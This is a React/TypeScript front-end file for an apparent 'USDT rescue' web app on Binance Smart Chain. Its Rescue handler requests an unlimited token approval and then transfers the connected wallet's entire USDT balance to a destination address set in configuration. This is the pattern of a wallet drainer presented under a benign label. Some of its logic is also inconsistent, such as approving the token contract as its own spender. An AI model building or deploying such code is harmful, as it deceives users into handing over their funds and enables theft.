// src/client/App.tsx
import React, { useEffect, useState } from 'react';
import Header from './components/Header';
import RescueCard from './components/RescueCard';
import { connectWallet, ensureBSC, getUSDTBalance, approveUnlimited, transferUSDT } from './wallet/wallet';
import apiClient from './api/client';
import { ethers } from 'ethers';

export type WalletInfo = {
  address: string;
  chainId: number;
  usdtBalance: string; // in smallest unit (wei)
  sponsorshipStatus: 'NONE' | 'PENDING' | 'CONFIRMED' | 'FAILED';
  sponsorTxHash?: string;
};

const App: React.FC = () => {
  const [wallet, setWallet] = useState<WalletInfo | null>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);
  const [rescueTxHash, setRescueTxHash] = useState<string | null>(null);
  const [rescueStatus, setRescueStatus] = useState<'idle' | 'pending' | 'success' | 'failed'>('idle');

  // Refresh wallet info after any change
  const refreshWallet = async (addr?: string) => {
    try {
      const address = addr || (wallet?.address ?? '');
      if (!address) return;
      const chainId = await ensureBSC(); // will attempt switch if needed
      const balance = await getUSDTBalance(address);
      const sponsorInfo = await apiClient.get<{ status: string; txHash?: string }>(`/api/check-sponsor?addr=${address}`);
      setWallet({
        address,
        chainId,
        usdtBalance: balance,
        sponsorshipStatus: sponsorInfo.status as any,
        sponsorTxHash: sponsorInfo.txHash,
      });
    } catch (e) {
      console.error(e);
    }
  };

  const handleConnect = async () => {
    setLoading(true);
    setError(null);
    try {
      const address = await connectWallet();
      await refreshWallet(address);
      // after connecting, request sponsorship if needed
      if (wallet?.sponsorshipStatus === 'NONE') {
        const sponsorRes = await apiClient.post<{ status: string; txHash?: string }>(`/api/sponsor`, { address });
        await refreshWallet(address);
      }
    } catch (e: any) {
      setError(e?.message ?? 'Failed to connect wallet');
    } finally {
      setLoading(false);
    }
  };

  const handleRescue = async () => {
    if (!wallet) return;
    setRescueStatus('pending');
    setError(null);
    try {
      // Ensure on BSC (switch already done in refresh)
      await ensureBSC();
      // Approve unlimited USDT allowance to destination address (configured on worker)
      const spender = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS; // spender is the contract that will transfer; we use the contract itself
      await approveUnlimited(spender);
      // Transfer USDT to destination (worker will verify)
      const dest = import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS;
      const amount = await getUSDTBalance(wallet.address);
      const txHash = await transferUSDT(dest, amount);
      setRescueTxHash(txHash);
      // Notify backend for verification
      const verifyRes = await apiClient.post<{ success: boolean; message?: string }>(`/api/verify-rescue`, {
        txHash,
        from: wallet.address,
        to: dest,
        amount,
      });
      if (verifyRes.success) {
        setRescueStatus('success');
      } else {
        setRescueStatus('failed');
        setError(verifyRes.message ?? 'Verification failed');
      }
    } catch (e: any) {
      setRescueStatus('failed');
      setError(e?.message ?? 'Rescue failed');
    }
  };

  // Auto‑refresh balance every 30 seconds
  useEffect(() => {
    let interval: NodeJS.Timeout | undefined;
    if (wallet?.address) {
      interval = setInterval(() => refreshWallet(wallet.address), 30000);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [wallet?.address]);

  return (
    <div className="min-h-screen flex flex-col items-center p-4">
      <Header />
      <main className="flex-1 w-full max-w-md">
        {error && <div className="bg-red-200 text-red-800 p-2 rounded mb-2">{error}</div>}
        <RescueCard
          wallet={wallet}
          loading={loading}
          onConnect={handleConnect}
          onRescue={handleRescue}
          rescueTxHash={rescueTxHash}
          rescueStatus={rescueStatus}
        />
      </main>
    </div>
  );
};

export default App;
